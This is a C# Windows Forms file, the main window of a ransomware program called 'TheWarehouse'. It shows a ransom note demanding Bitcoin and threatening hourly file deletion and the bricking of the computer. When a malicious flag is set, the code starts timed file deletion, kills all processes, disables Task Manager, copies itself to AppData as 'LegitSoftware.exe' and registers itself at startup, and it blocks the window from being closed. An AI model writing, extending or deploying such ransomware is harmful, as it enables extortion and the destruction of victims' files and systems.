using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using TheWarehouse.Algorithm;
using TheWarehouse.Config;
using TheWarehouse.Utils;

namespace TheWarehouse
{
    public partial class Root : Form
    {
        public static Root Instance { get; set; } = new Root();

        private DateTime EventDate = DateTime.Now + new TimeSpan(1, 23, 59, 59);

        public Root()
        {
            InitializeComponent();
        }

        private void Root_Load(object sender, EventArgs e)
        {
            Instance.Show();

            wbInfo.DocumentText = "<!DOCTYPE html><html><head><style>body{font-family: Arial, \"Helvetica Neue\", Helvetica, sans-serif;}p{font-size: 14px;}h1{font-size: 22px;}</style></head><body> <h1>Your important files have been encrypted!</h1> <p>Most of your files are no longer accessible or usable due to them being encrypted. You are probably searching for a way to recover them, but do not waste your time. You can only recover your files with our decryption service.</p><p>To decrypt all of your files, you will have to pay for a password. Take note that every hour, a random amount of your files will be deleted, from random directories on your computer. If you value these files, pay the needed amount and decrypt these files.</p><p>Payments are accepted only in BTC to the address below. Beware, you only have some time left before all your files get deleted. After the time goes out, this tool will proceed to destroy and corrupt all of the necessary files needed for the computer to run, hence bricking your computer and making it useless.</p></body></html>";
            tVisual.Start();

            lblAdmin.Text += (SystemUtils.IsAdministrator()) ? "admin" : "user";

            if (Configuration.Instance.IsMalicious)
            {
                
                tDelete.Start();

                //KeyboardHook.Instance.Hook();

                SystemUtils.KillAllProcesses();
                SystemUtils.DisableTaskManager();
                SystemUtils.CopyFile(Application.ExecutablePath, Configuration.Instance.AppData + @"\LegitSoftware.exe");
                SystemUtils.AddStartUp(Configuration.Instance.AppData + @"\LegitSoftware.exe");
            }
            else MessageBox.Show("Malicious is not set.");
        }

        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            if (Configuration.Instance.IsMalicious)
            {
                EncryptionService.Encrypt();
            }
            else MessageBox.Show("Malicious is not set.");
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            if (Configuration.Instance.IsMalicious)
            {
                EncryptionService.Decrypt();
            }
            else MessageBox.Show("Malicious is not set.");
        }

        private void tVisual_Tick(object sender, EventArgs e)
        {
            TimeSpan remaining = EventDate - DateTime.Now;

            if (remaining.TotalSeconds < 1)
            {
                tVisual.Stop();
                tDelete.Stop();

                if (Configuration.Instance.IsMalicious)
                {
                    EncryptionService.Decrypt();
                }
                else MessageBox.Show("Malicious is not set.");
            }
            else
            {
                string seconds = remaining.Seconds.ToString();
                if (remaining.Seconds < 10) seconds = $"0{seconds}";
                lblTime.Text = remaining.Hours + ":" + remaining.Minutes + ":" + seconds;
            }
        }

        private void tDelete_Tick(object sender, EventArgs e)
        {
            if (Configuration.Instance.IsMalicious)
            {
                SystemUtils.DeleteFiles();
            }
            else MessageBox.Show("Malicious is not set.");
        }

        private void Root_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Configuration.Instance.IsMalicious)
            {
                e.Cancel = true;
                base.OnClosing(e);
            }
            else MessageBox.Show("Malicious is not set.");
        }
    }
}
